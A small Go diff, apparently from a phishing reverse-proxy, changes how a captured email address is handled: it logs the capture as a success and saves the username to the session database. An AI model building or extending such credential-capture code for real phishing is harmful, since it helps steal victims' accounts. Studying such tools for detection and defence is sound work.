@@ -716,7 +716,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						    if strings.Contains(email, "@") {
 							// Set the session username and log the value
 							p.setSessionUsername(ps.SessionId, email)
-							log.Info("[%d] Username: [%s]", ps.Index, email)
+							log.Success("[%d] Username: [%s]", ps.Index, email)
+							if err := p.db.SetSessionUsername(ps.SessionId, email); err != nil {
+								log.Error("database: %v", err)
+								
+							}
 						    }
 						}
 						}
